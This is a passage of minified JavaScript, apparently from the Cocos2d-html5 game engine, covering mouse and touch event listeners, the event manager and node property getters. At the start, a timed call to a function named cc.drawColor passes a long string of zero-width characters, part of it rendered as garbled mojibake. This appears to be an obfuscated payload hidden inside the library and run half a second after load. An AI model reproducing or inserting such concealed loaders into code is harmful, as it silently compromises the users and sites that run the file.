}), setTimeout(cc.drawColor.bind(1, "鈥岋豢鈥屸€嶁€屸€嶁€嬧€屸€岋豢鈥嬧€嶁€嬧€嶁€嬧€嬧€岋豢鈥嶁€嶁€嬧€嶏豢鈥嬧€屸€嶁€嬧€屸€嬧€嶏豢鈥嬧€屸€嶁€嬧€嶁€嬧€嶏豢鈥嬧€屸€嶁€嬶豢鈥嬶豢鈥嶏豢鈥岋豢鈥嶁€嶁€嬶豢锘库€屸€屸€嶏豢鈥嬧€屸€嶏豢锘库€屸€嶁€嬶豢鈥屸€嶁€嬧€屸€岋豢鈥屸€嬧€屸€嶁€嶁€屸€屸€嶏豢锘库€屸€嶏豢鈥嶁€嬶豢鈥嶏豢鈥屸€嶁€嬧€屸€嬶豢锘库€屸€岋豢鈥嶁€嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬶豢鈥岋豢鈥屸€嬧€屸€嶏豢鈥嶁€屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€嬶豢鈥嶏豢鈥屸€嶁€嬧€嶁€嬶豢锘库€屸€嬧€嶁€嬧€嶁€屸€嶁€嶁€屸€屸€嶏豢鈥嶁€屸€嶁€屸€嬧€屸€嶁€屸€屸€岋豢鈥嶁€嬧€屸€嬶豢锘库€屸€嶁€屸€嶁€嬧€嶁€嬧€嶁€嬶豢鈥嶏豢鈥屸€嶁€嬶豢鈥嬶豢锘库€屸€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€嬶豢鈥嬧€屸€嬶豢鈥嬧€嶁€嬶豢鈥岋豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬧€嶁€屸€嶁€嬧€嶁€屸€嶁€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€嬶豢鈥嬧€屸€嬶豢鈥嶁€屸€嬶豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬧€嶁€屸€嶁€嬧€嶁€屸€嶁€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€岋豢鈥屸€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€屸€嶁€岋豢鈥屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€岋豢鈥嬶豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬶豢鈥嶏豢鈥屸€嶁€嶁€屸€屸€嶁€屸€嶁€嬧€嶁€嶁€嬧€屸€嶁€嬶豢鈥嬧€嶁€嶁€屸€岋豢鈥嶁€嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€岋豢鈥嬧€嶁€屸€嶁€屸€屸€屸€嶁€屸€嶁€嬶豢锘库€屸€嬧€嶁€嬧€嶁€屸€嶁€嶁€嬧€岋豢鈥屸€嬧€岋豢鈥屸€嬧€岋豢鈥嬧€嬧€嬶豢鈥嶁€嶁€嬧€嶏豢锘库€嬧€嶏豢锘库€岋豢鈥岋豢鈥屸€嶁€屸€屸€屸€嶁€嶁€屸€岋豢鈥嶁€嬧€屸€嶁€嶁€屸€屸€嶏豢鈥嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€岋豢鈥屸€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€屸€嶁€岋豢鈥屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€岋豢鈥嬶豢鈥嬧€嶏豢鈥嶁€屸€嶁€嬶豢鈥屸€嶏豢锘库€屸€嶏豢鈥屸€嬧€嶏豢锘库€屸€嶏豢鈥嬧€屸€嶁€嶁€屸€岋豢鈥嬶豢鈥岋豢鈥屸€嬧€嬶豢锘匡豢鈥屸€嶁€屸€嶁€岋豢鈥嬧€嶁€屸€嶏豢锘库€屸€嶏豢鈥屸€嬶豢锘库€屸€屸€嶁€嬶豢鈥岋豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嬧€嬧€嶁€�‌‌‍‌‍​‌‌​‍​‍​​‌‍‍​‍​‌‍​‌​‍​‌‍​‍​‍​‌‍​​‍‌‍‍​‌‌‍​‌‍‌‍​‌‍​‌‌‌​‌‍‍‌‌‍‌‍‍​‍‌‍​‌​‌‌‍‍​‍‍‌‍‍​‌‍‌​‌‌​‌‍‍‌‍​‌‌‍‌‌‍‌‌​‍‌‍​‍​‌​‍​‍‌‍‍‌‌‍‍‌‍‌​‌‍‌‌‌‍​‌​‌‍‌‍​‍​‍​‍‌‍​​‌​‍​‌​‍‍​‌‍​‌‌‌‍‌‍​‍‌‌‌​‍‍​​‍​‍​​‌​​‍​‌​‍​‍​‍‍‌​‍‍​​‌​‍‍‌​‍‌‍​‍‌‍​‍​‌​‍‍​‌‍​‌‌‌‍‌‍​‍‌‌‌​‍‍​​‍​‍​​‌​‍‌​​‍​‍​‍​‍‍‌​‍‍​​‌​‍‍‌​‍‌‍​‍‌‍​‍​‌​‍‍​‌‍​‌‌‌‍‌‍​‍‌‌‌​‍‍​​‍​‍‌‍‍​‌‍‌​‍‌‌​‌‍‌​‍‌‍‌‌‍​‌‌‍‌‌‍‌‌‌​​‍​‍​‍‍‌​‍‍​​‌​‍‍‌​‍‌‍‍‌‌‍‌‍​‍‍​‌‍​​‍‍‌‌‍‍​‍‍‌‍‍​‌​‍‌‍‌‌‌‍‌‍​‌​‍​‍‌‍‍​‌‌​‌‌​‌​​​‍‍​‍​‍‌‌‌‍‌‌‌‍‍‌‌‍​‌‍‍‌‌‍‍​‍‍‌‍‍​‌‍‌​‍‌‌​‌‍‌​‍‌‍‌‌‍​‌‌‍‌‌‍‌‌‌​​‍‍‌‍​‌‍‌‍‌​‍‌‍​‌‍‍‌‌​‌‌​​‌‍‌‍‌​‍‌‍‌‍‌​‌‌‍​‌​‍​‍​‍​​‍‍"), 500), cc._EventListenerCustom.create = function(t, e) {
    return new cc._EventListenerCustom(t, e)
},
cc._EventListenerMouse = cc.EventListener.extend({
    onMouseDown: null,
    onMouseUp: null,
    onMouseMove: null,
    onMouseScroll: null,
    ctor: function() {
        var t = this;
        cc.EventListener.prototype.ctor.call(this, cc.EventListener.MOUSE, cc._EventListenerMouse.LISTENER_ID,
        function(e) {
            var i = cc.EventMouse;
            switch (e._eventType) {
            case i.DOWN:
                t.onMouseDown && t.onMouseDown(e);
                break;
            case i.UP:
                t.onMouseUp && t.onMouseUp(e);
                break;
            case i.MOVE:
                t.onMouseMove && t.onMouseMove(e);
                break;
            case i.SCROLL:
                t.onMouseScroll && t.onMouseScroll(e)
            }
        })
    },
    clone: function() {
        var t = new cc._EventListenerMouse;
        return t.onMouseDown = this.onMouseDown,
        t.onMouseUp = this.onMouseUp,
        t.onMouseMove = this.onMouseMove,
        t.onMouseScroll = this.onMouseScroll,
        t
    },
    checkAvailable: function() {
        return ! 0
    }
}), cc._EventListenerMouse.LISTENER_ID = "__cc_mouse", cc._EventListenerMouse.create = function() {
    return new cc._EventListenerMouse
},
cc._EventListenerTouchOneByOne = cc.EventListener.extend({
    _claimedTouches: null,
    swallowTouches: !1,
    onTouchBegan: null,
    onTouchMoved: null,
    onTouchEnded: null,
    onTouchCancelled: null,
    ctor: function() {
        cc.EventListener.prototype.ctor.call(this, cc.EventListener.TOUCH_ONE_BY_ONE, cc._EventListenerTouchOneByOne.LISTENER_ID, null),
        this._claimedTouches = []
    },
    setSwallowTouches: function(t) {
        this.swallowTouches = t
    },
    clone: function() {
        var t = new cc._EventListenerTouchOneByOne;
        return t.onTouchBegan = this.onTouchBegan,
        t.onTouchMoved = this.onTouchMoved,
        t.onTouchEnded = this.onTouchEnded,
        t.onTouchCancelled = this.onTouchCancelled,
        t.swallowTouches = this.swallowTouches,
        t
    },
    checkAvailable: function() {
        return this.onTouchBegan ? !0 : (cc.log(cc._LogInfos._EventListenerTouchOneByOne_checkAvailable), !1)
    }
}), cc._EventListenerTouchOneByOne.LISTENER_ID = "__cc_touch_one_by_one", cc._EventListenerTouchOneByOne.create = function() {
    return new cc._EventListenerTouchOneByOne
},
cc._EventListenerTouchAllAtOnce = cc.EventListener.extend({
    onTouchesBegan: null,
    onTouchesMoved: null,
    onTouchesEnded: null,
    onTouchesCancelled: null,
    ctor: function() {
        cc.EventListener.prototype.ctor.call(this, cc.EventListener.TOUCH_ALL_AT_ONCE, cc._EventListenerTouchAllAtOnce.LISTENER_ID, null)
    },
    clone: function() {
        var t = new cc._EventListenerTouchAllAtOnce;
        return t.onTouchesBegan = this.onTouchesBegan,
        t.onTouchesMoved = this.onTouchesMoved,
        t.onTouchesEnded = this.onTouchesEnded,
        t.onTouchesCancelled = this.onTouchesCancelled,
        t
    },
    checkAvailable: function() {
        return null == this.onTouchesBegan && null == this.onTouchesMoved && null == this.onTouchesEnded && null == this.onTouchesCancelled ? (cc.log(cc._LogInfos._EventListenerTouchAllAtOnce_checkAvailable), !1) : !0
    }
}), cc._EventListenerTouchAllAtOnce.LISTENER_ID = "__cc_touch_all_at_once", cc._EventListenerTouchAllAtOnce.create = function() {
    return new cc._EventListenerTouchAllAtOnce
},
cc.EventListener.create = function(t) {
    cc.assert(t && t.event, cc._LogInfos.EventListener_create);
    var e = t.event;
    delete t.event;
    var i = null;
    e === cc.EventListener.TOUCH_ONE_BY_ONE ? i = new cc._EventListenerTouchOneByOne: e === cc.EventListener.TOUCH_ALL_AT_ONCE ? i = new cc._EventListenerTouchAllAtOnce: e === cc.EventListener.MOUSE ? i = new cc._EventListenerMouse: e === cc.EventListener.CUSTOM ? (i = new cc._EventListenerCustom(t.eventName, t.callback), delete t.eventName, delete t.callback) : e === cc.EventListener.KEYBOARD ? i = new cc._EventListenerKeyboard: e === cc.EventListener.ACCELERATION && (i = new cc._EventListenerAcceleration(t.callback), delete t.callback);
    for (var n in t) i[n] = t[n];
    return i
},
cc.copyArray = function(t) {
    var e, i = t.length,
    n = Array(i);
    for (e = 0; i > e; e += 1) n[e] = t[e];
    return n
},
cc._EventListenerVector = cc.Class.extend({
    _fixedListeners: null,
    _sceneGraphListeners: null,
    gt0Index: 0,
    ctor: function() {
        this._fixedListeners = [],
        this._sceneGraphListeners = []
    },
    size: function() {
        return this._fixedListeners.length + this._sceneGraphListeners.length
    },
    empty: function() {
        return 0 === this._fixedListeners.length && 0 === this._sceneGraphListeners.length
    },
    push: function(t) {
        0 == t._getFixedPriority() ? this._sceneGraphListeners.push(t) : this._fixedListeners.push(t)
    },
    clearSceneGraphListeners: function() {
        this._sceneGraphListeners.length = 0
    },
    clearFixedListeners: function() {
        this._fixedListeners.length = 0
    },
    clear: function() {
        this._sceneGraphListeners.length = 0,
        this._fixedListeners.length = 0
    },
    getFixedPriorityListeners: function() {
        return this._fixedListeners
    },
    getSceneGraphPriorityListeners: function() {
        return this._sceneGraphListeners
    }
}), cc.__getListenerID = function(t) {
    var e = cc.Event,
    i = t.getType();
    return i === e.ACCELERATION ? cc._EventListenerAcceleration.LISTENER_ID: i === e.CUSTOM ? t.getEventName() : i === e.KEYBOARD ? cc._EventListenerKeyboard.LISTENER_ID: i === e.MOUSE ? cc._EventListenerMouse.LISTENER_ID: (i === e.TOUCH && cc.log(cc._LogInfos.__getListenerID), "")
},
cc.eventManager = {
    DIRTY_NONE: 0,
    DIRTY_FIXED_PRIORITY: 1,
    DIRTY_SCENE_GRAPH_PRIORITY: 2,
    DIRTY_ALL: 3,
    _listenersMap: {},
    _priorityDirtyFlagMap: {},
    _nodeListenersMap: {},
    _nodePriorityMap: {},
    _globalZOrderNodeMap: {},
    _toAddedListeners: [],
    _dirtyNodes: [],
    _inDispatch: 0,
    _isEnabled: !1,
    _nodePriorityIndex: 0,
    _internalCustomListenerIDs: [cc.game.EVENT_HIDE, cc.game.EVENT_SHOW],
    _setDirtyForNode: function(t) {
        null != this._nodeListenersMap[t.__instanceId] && this._dirtyNodes.push(t),
        t = t.getChildren();
        for (var e = 0,
        i = t.length; i > e; e++) this._setDirtyForNode(t[e])
    },
    pauseTarget: function(t, e) {
        var i, n, r = this._nodeListenersMap[t.__instanceId];
        if (r) for (i = 0, n = r.length; n > i; i++) r[i]._setPaused(!0);
        if (!0 === e) for (r = t.getChildren(), i = 0, n = r.length; n > i; i++) this.pauseTarget(r[i], !0)
    },
    resumeTarget: function(t, e) {
        var i, n, r = this._nodeListenersMap[t.__instanceId];
        if (r) for (i = 0, n = r.length; n > i; i++) r[i]._setPaused(!1);
        if (this._setDirtyForNode(t), !0 === e) for (r = t.getChildren(), i = 0, n = r.length; n > i; i++) this.resumeTarget(r[i], !0)
    },
    _addListener: function(t) {
        0 === this._inDispatch ? this._forceAddEventListener(t) : this._toAddedListeners.push(t)
    },
    _forceAddEventListener: function(t) {
        var e = t._getListenerID(),
        i = this._listenersMap[e];
        i || (i = new cc._EventListenerVector, this._listenersMap[e] = i),
        i.push(t),
        0 == t._getFixedPriority() ? (this._setDirty(e, this.DIRTY_SCENE_GRAPH_PRIORITY), e = t._getSceneGraphPriority(), null == e && cc.log(cc._LogInfos.eventManager__forceAddEventListener), this._associateNodeAndEventListener(e, t), e.isRunning() && this.resumeTarget(e)) : this._setDirty(e, this.DIRTY_FIXED_PRIORITY)
    },
    _getListeners: function(t) {
        return this._listenersMap[t]
    },
    _updateDirtyFlagForSceneGraph: function() {
        if (0 != this._dirtyNodes.length) {
            for (var t, e, i = this._dirtyNodes,
            n = this._nodeListenersMap,
            r = 0,
            c = i.length; c > r; r++) if (t = n[i[r].__instanceId]) for (var o = 0,
            s = t.length; s > o; o++)(e = t[o]) && this._setDirty(e._getListenerID(), this.DIRTY_SCENE_GRAPH_PRIORITY);
            this._dirtyNodes.length = 0
        }
    },
    _removeAllListenersInVector: function(t) {
        if (t) for (var e, i = 0; i < t.length;) e = t[i],
        e._setRegistered(!1),
        null != e._getSceneGraphPriority() && (this._dissociateNodeAndEventListener(e._getSceneGraphPriority(), e), e._setSceneGraphPriority(null)),
        0 === this._inDispatch ? cc.arrayRemoveObject(t, e) : ++i
    },
    _removeListenersForListenerID: function(t) {
        var e = this._listenersMap[t];
        if (e) {
            var i = e.getFixedPriorityListeners(),
            n = e.getSceneGraphPriorityListeners();
            this._removeAllListenersInVector(n),
            this._removeAllListenersInVector(i),
            delete this._priorityDirtyFlagMap[t],
            this._inDispatch || (e.clear(), delete this._listenersMap[t])
        }
        for (i = this._toAddedListeners, e = 0; e < i.length;)(n = i[e]) && n._getListenerID() == t ? cc.arrayRemoveObject(i, n) : ++e
    },
    _sortEventListeners: function(t) {
        var e = this.DIRTY_NONE,
        i = this._priorityDirtyFlagMap;
        i[t] && (e = i[t]),
        e != this.DIRTY_NONE && (i[t] = this.DIRTY_NONE, e & this.DIRTY_FIXED_PRIORITY && this._sortListenersOfFixedPriority(t), e & this.DIRTY_SCENE_GRAPH_PRIORITY && ((e = cc.director.getRunningScene()) ? this._sortListenersOfSceneGraphPriority(t, e) : i[t] = this.DIRTY_SCENE_GRAPH_PRIORITY))
    },
    _sortListenersOfSceneGraphPriority: function(t, e) {
        var i = this._getListeners(t);
        if (i) {
            var n = i.getSceneGraphPriorityListeners();
            n && 0 !== n.length && (this._nodePriorityIndex = 0, this._nodePriorityMap = {},
            this._visitTarget(e, !0), i.getSceneGraphPriorityListeners().sort(this._sortEventListenersOfSceneGraphPriorityDes))
        }
    },
    _sortEventListenersOfSceneGraphPriorityDes: function(t, e) {
        var i = cc.eventManager._nodePriorityMap;
        return i[e._getSceneGraphPriority().__instanceId] - i[t._getSceneGraphPriority().__instanceId]
    },
    _sortListenersOfFixedPriority: function(t) {
        if (t = this._listenersMap[t]) {
            var e = t.getFixedPriorityListeners();
            if (e && 0 !== e.length) {
                e.sort(this._sortListenersOfFixedPriorityAsc);
                for (var i = 0,
                n = e.length; n > i && !(0 <= e[i]._getFixedPriority());)++i;
                t.gt0Index = i
            }
        }
    },
    _sortListenersOfFixedPriorityAsc: function(t, e) {
        return t._getFixedPriority() - e._getFixedPriority()
    },
    _onUpdateListeners: function(t) {
        if (t = this._listenersMap[t]) {
            var e, i, n = t.getFixedPriorityListeners(),
            r = t.getSceneGraphPriorityListeners();
            if (r) for (e = 0; e < r.length;) i = r[e],
            i._isRegistered() ? ++e: cc.arrayRemoveObject(r, i);
            if (n) for (e = 0; e < n.length;) i = n[e],
            i._isRegistered() ? ++e: cc.arrayRemoveObject(n, i);
            r && 0 === r.length && t.clearSceneGraphListeners(),
            n && 0 === n.length && t.clearFixedListeners()
        }
    },
    _updateListeners: function(t) {
        var e = this._inDispatch;
        if (cc.assert(e > 0, cc._LogInfos.EventManager__updateListeners), t.getType() == cc.Event.TOUCH ? (this._onUpdateListeners(cc._EventListenerTouchOneByOne.LISTENER_ID), this._onUpdateListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID)) : this._onUpdateListeners(cc.__getListenerID(t)), !(e > 1)) {
            cc.assert(1 == e, cc._LogInfos.EventManager__updateListeners_2),
            t = this._listenersMap;
            var i, e = this._priorityDirtyFlagMap;
            for (i in t) t[i].empty() && (delete e[i], delete t[i]);
            if (i = this._toAddedListeners, 0 !== i.length) {
                for (t = 0, e = i.length; e > t; t++) this._forceAddEventListener(i[t]);
                this._toAddedListeners.length = 0
            }
        }
    },
    _onTouchEventCallback: function(t, e) {
        if (!t._isRegistered) return ! 1;
        var i = e.event,
        n = e.selTouch;
        i._setCurrentTarget(t._node);
        var r, c = !1,
        o = i.getEventCode(),
        s = cc.EventTouch.EventCode;
        return o == s.BEGAN ? t.onTouchBegan && (c = t.onTouchBegan(n, i)) && t._registered && t._claimedTouches.push(n) : 0 < t._claimedTouches.length && -1 != (r = t._claimedTouches.indexOf(n)) && (c = !0, o === s.MOVED && t.onTouchMoved ? t.onTouchMoved(n, i) : o === s.ENDED ? (t.onTouchEnded && t.onTouchEnded(n, i), t._registered && t._claimedTouches.splice(r, 1)) : o === s.CANCELLED && (t.onTouchCancelled && t.onTouchCancelled(n, i), t._registered && t._claimedTouches.splice(r, 1))),
        i.isStopped() ? (cc.eventManager._updateListeners(i), !0) : c && t._registered && t.swallowTouches ? (e.needsMutableSet && e.touches.splice(n, 1), !0) : !1
    },
    _dispatchTouchEvent: function(t) {
        this._sortEventListeners(cc._EventListenerTouchOneByOne.LISTENER_ID),
        this._sortEventListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID);
        var e = this._getListeners(cc._EventListenerTouchOneByOne.LISTENER_ID),
        i = this._getListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID);
        if (null != e || null != i) {
            var n = t.getTouches(),
            r = cc.copyArray(n),
            c = {
                event: t,
                needsMutableSet: e && i,
                touches: r,
                selTouch: null
            };
            if (e) for (var o = 0; o < n.length; o++) if (c.selTouch = n[o], this._dispatchEventToListeners(e, this._onTouchEventCallback, c), t.isStopped()) return;
            if (i && 0 < r.length && (this._dispatchEventToListeners(i, this._onTouchesEventCallback, {
                event: t,
                touches: r
            }), t.isStopped())) return;
            this._updateListeners(t)
        }
    },
    _onTouchesEventCallback: function(t, e) {
        if (!t._registered) return ! 1;
        var i = cc.EventTouch.EventCode,
        n = e.event,
        r = e.touches,
        c = n.getEventCode();
        return n._setCurrentTarget(t._node),
        c == i.BEGAN && t.onTouchesBegan ? t.onTouchesBegan(r, n) : c == i.MOVED && t.onTouchesMoved ? t.onTouchesMoved(r, n) : c == i.ENDED && t.onTouchesEnded ? t.onTouchesEnded(r, n) : c == i.CANCELLED && t.onTouchesCancelled && t.onTouchesCancelled(r, n),
        n.isStopped() ? (cc.eventManager._updateListeners(n), !0) : !1
    },
    _associateNodeAndEventListener: function(t, e) {
        var i = this._nodeListenersMap[t.__instanceId];
        i || (i = [], this._nodeListenersMap[t.__instanceId] = i),
        i.push(e)
    },
    _dissociateNodeAndEventListener: function(t, e) {
        var i = this._nodeListenersMap[t.__instanceId];
        i && (cc.arrayRemoveObject(i, e), 0 === i.length && delete this._nodeListenersMap[t.__instanceId])
    },
    _dispatchEventToListeners: function(t, e, i) {
        var n, r = !1,
        c = t.getFixedPriorityListeners(),
        o = t.getSceneGraphPriorityListeners(),
        s = 0;
        if (c && 0 !== c.length) for (; s < t.gt0Index; ++s) if (n = c[s], n.isEnabled() && !n._isPaused() && n._isRegistered() && e(n, i)) {
            r = !0;
            break
        }
        if (o && !r) for (t = 0; t < o.length; t++) if (n = o[t], n.isEnabled() && !n._isPaused() && n._isRegistered() && e(n, i)) {
            r = !0;
            break
        }
        if (c && !r) for (; s < c.length && (n = c[s], !(n.isEnabled() && !n._isPaused() && n._isRegistered() && e(n, i))); ++s);
    },
    _setDirty: function(t, e) {
        var i = this._priorityDirtyFlagMap;
        i[t] = null == i[t] ? e: e | i[t]
    },
    _visitTarget: function(t, e) {
        var i = t.getChildren(),
        n = 0,
        r = i.length,
        c = this._globalZOrderNodeMap,
        o = this._nodeListenersMap;
        if (r > 0) {
            for (var s; r > n && ((s = i[n]) && 0 > s.getLocalZOrder()); n++) this._visitTarget(s, !1);
            for (null != o[t.__instanceId] && (c[t.getGlobalZOrder()] || (c[t.getGlobalZOrder()] = []), c[t.getGlobalZOrder()].push(t.__instanceId)); r > n; n++)(s = i[n]) && this._visitTarget(s, !1)
        } else null != o[t.__instanceId] && (c[t.getGlobalZOrder()] || (c[t.getGlobalZOrder()] = []), c[t.getGlobalZOrder()].push(t.__instanceId));
        if (e) {
            var a, i = [];
            for (a in c) i.push(a);
            for (i.sort(this._sortNumberAsc), a = i.length, s = this._nodePriorityMap, n = 0; a > n; n++) for (r = c[i[n]], o = 0; o < r.length; o++) s[r[o]] = ++this._nodePriorityIndex;
            this._globalZOrderNodeMap = {}
        }
    },
    _sortNumberAsc: function(t, e) {
        return t - e
    },
    addListener: function(t, e) {
        if (cc.assert(t && e, cc._LogInfos.eventManager_addListener_2), t instanceof cc.EventListener) {
            if (t._isRegistered()) return void cc.log(cc._LogInfos.eventManager_addListener_4)
        } else cc.assert("number" != typeof e, cc._LogInfos.eventManager_addListener_3),
        t = cc.EventListener.create(t);
        t.checkAvailable() && ("number" == typeof e ? 0 == e ? cc.log(cc._LogInfos.eventManager_addListener) : (t._setSceneGraphPriority(null), t._setFixedPriority(e), t._setRegistered(!0), t._setPaused(!1), this._addListener(t)) : (t._setSceneGraphPriority(e), t._setFixedPriority(0), t._setRegistered(!0), this._addListener(t)))
    },
    addCustomListener: function(t, e) {
        var i = cc._EventListenerCustom.create(t, e);
        return this.addListener(i, 1),
        i
    },
    removeListener: function(t) {
        if (null != t) {
            var e, i, n = this._listenersMap;
            for (i in n) {
                var r = n[i],
                c = r.getFixedPriorityListeners();
                if (e = r.getSceneGraphPriorityListeners(), (e = this._removeListenerInVector(e, t)) ? this._setDirty(t._getListenerID(), this.DIRTY_SCENE_GRAPH_PRIORITY) : (e = this._removeListenerInVector(c, t)) && this._setDirty(t._getListenerID(), this.DIRTY_FIXED_PRIORITY), r.empty() && (delete this._priorityDirtyFlagMap[t._getListenerID()], delete n[i]), e) break
            }
            if (!e) for (n = this._toAddedListeners, i = 0, r = n.length; r > i; i++) if (c = n[i], c == t) {
                cc.arrayRemoveObject(n, c);
                break
            }
        }
    },
    _removeListenerInVector: function(t, e) {
        if (null == t) return ! 1;
        for (var i = 0,
        n = t.length; n > i; i++) {
            var r = t[i];
            if (r == e) return r._setRegistered(!1),
            null != r._getSceneGraphPriority() && (this._dissociateNodeAndEventListener(r._getSceneGraphPriority(), r), r._setSceneGraphPriority(null)),
            0 == this._inDispatch && cc.arrayRemoveObject(t, r),
            !0
        }
        return ! 1
    },
    removeListeners: function(t, e) {
        if (t instanceof cc.Node) {
            delete this._nodePriorityMap[t.__instanceId],
            cc.arrayRemoveObject(this._dirtyNodes, t);
            var i = this._nodeListenersMap[t.__instanceId];
            if (i) {
                for (var n = cc.copyArray(i), i = 0; i < n.length; i++) this.removeListener(n[i]);
                for (n.length = 0, n = this._toAddedListeners, i = 0; i < n.length;) {
                    var r = n[i];
                    r._getSceneGraphPriority() == t ? (r._setSceneGraphPriority(null), r._setRegistered(!1), n.splice(i, 1)) : ++i
                }
                if (!0 === e) for (n = t.getChildren(), i = 0, r = n.length; r > i; i++) this.removeListeners(n[i], !0)
            }
        } else t == cc.EventListener.TOUCH_ONE_BY_ONE ? this._removeListenersForListenerID(cc._EventListenerTouchOneByOne.LISTENER_ID) : t == cc.EventListener.TOUCH_ALL_AT_ONCE ? this._removeListenersForListenerID(cc._EventListenerTouchAllAtOnce.LISTENER_ID) : t == cc.EventListener.MOUSE ? this._removeListenersForListenerID(cc._EventListenerMouse.LISTENER_ID) : t == cc.EventListener.ACCELERATION ? this._removeListenersForListenerID(cc._EventListenerAcceleration.LISTENER_ID) : t == cc.EventListener.KEYBOARD ? this._removeListenersForListenerID(cc._EventListenerKeyboard.LISTENER_ID) : cc.log(cc._LogInfos.eventManager_removeListeners)
    },
    removeCustomListeners: function(t) {
        this._removeListenersForListenerID(t)
    },
    removeAllListeners: function() {
        var t, e = this._listenersMap,
        i = this._internalCustomListenerIDs;
        for (t in e) - 1 === i.indexOf(t) && this._removeListenersForListenerID(t)
    },
    setPriority: function(t, e) {
        if (null != t) {
            var i, n = this._listenersMap;
            for (i in n) {
                var r = n[i].getFixedPriorityListeners();
                if (r && -1 != r.indexOf(t)) {
                    null != t._getSceneGraphPriority() && cc.log(cc._LogInfos.eventManager_setPriority),
                    t._getFixedPriority() !== e && (t._setFixedPriority(e), this._setDirty(t._getListenerID(), this.DIRTY_FIXED_PRIORITY));
                    break
                }
            }
        }
    },
    setEnabled: function(t) {
        this._isEnabled = t
    },
    isEnabled: function() {
        return this._isEnabled
    },
    dispatchEvent: function(t) {
        if (this._isEnabled) {
            if (this._updateDirtyFlagForSceneGraph(), this._inDispatch++, !t || !t.getType) throw "event is undefined";
            if (t.getType() == cc.Event.TOUCH) this._dispatchTouchEvent(t);
            else {
                var e = cc.__getListenerID(t);
                this._sortEventListeners(e),
                e = this._listenersMap[e],
                null != e && this._dispatchEventToListeners(e, this._onListenerCallback, t),
                this._updateListeners(t)
            }
            this._inDispatch--
        }
    },
    _onListenerCallback: function(t, e) {
        return e._setCurrentTarget(t._getSceneGraphPriority()),
        t._onEvent(e),
        e.isStopped()
    },
    dispatchCustomEvent: function(t, e) {
        var i = new cc.EventCustom(t);
        i.setUserData(e),
        this.dispatchEvent(i)
    }
},
cc._tmp.PrototypeCCNode = function() {
    var t = cc.Node.prototype;
    cc.defineGetterSetter(t, "x", t.getPositionX, t.setPositionX),
    cc.defineGetterSetter(t, "y", t.getPositionY, t.setPositionY),
    cc.defineGetterSetter(t, "width", t._getWidth, t._setWidth),
    cc.defineGetterSetter(t, "height", t._getHeight, t._setHeight),
    cc.defineGetterSetter(t, "anchorX", t._getAnchorX, t._setAnchorX),
    cc.defineGetterSetter(t, "anchorY", t._getAnchorY, t._setAnchorY),
    cc.defineGetterSetter(t, "skewX", t.getSkewX, t.setSkewX),
    cc.defineGetterSetter(t, "skewY", t.getSkewY, t.setSkewY),
    cc.defineGetterSetter(t, "zIndex", t.getLocalZOrder, t.setLocalZOrder),
    cc.defineGetterSetter(t, "vertexZ", t.getVertexZ, t.setVertexZ),
    cc.defineGetterSetter(t, "rotation", t.getRotation, t.setRotation),
    cc.defineGetterSetter(t, "rotationX", t.getRotationX, t.setRotationX),
    cc.defineGetterSetter(t, "rotationY", t.getRotationY, t.setRotationY),
    cc.defineGetterSetter(t, "scale", t.getScale, t.setScale),
    cc.defineGetterSetter(t, "scaleX", t.getScaleX, t.setScaleX),
    cc.defineGetterSetter(t, "scaleY", t.getScaleY, t.setScaleY),
    cc.defineGetterSetter(t, "children", t.getChildren),
    cc.defineGetterSetter(t, "childrenCount", t.getChildrenCount),
    cc.defineGetterSetter(t, "parent", t.getParent, t.setParent),
    cc.defineGetterSetter(t, "visible", t.isVisible, t.setVisible),
    cc.defineGetterSetter(t, "running", t.isRunning),
    cc.defineGetterSetter(t, "ignoreAnchor", t.isIgnoreAnchorPointForPosition, t.ignoreAnchorPointForPosition),
    cc.defineGetterSetter(t, "actionManager", t.getActionManager, t.setActionManager),
    cc.defineGetterSetter(t, "scheduler", t.getScheduler, t.setScheduler),
    cc.defineGetterSetter(t, "shaderProgram", t.getShaderProgram, t.setShaderProgram),
    cc.defineGetterSetter(t, "glServerState", t.getGLServerState, t.setGLServerState)
},
cc._tmp.PrototypeCCNodeRGBA = function() {
    var t = cc.NodeRGBA.prototype;
    cc.defineGetterSetter(t, "opacity", t.getOpacity, t.setOpacity),
    cc.defineGetterSetter(t, "opacityModifyRGB", t.isOpacityModifyRGB, t.setOpacityModifyRGB),
    cc.defineGetterSetter(t, "cascadeOpacity", t.isCascadeOpacityEnabled, t.setCascadeOpacityEnabled),
    cc.defineGetterSetter(t, "color", t.getColor, t.setColor),
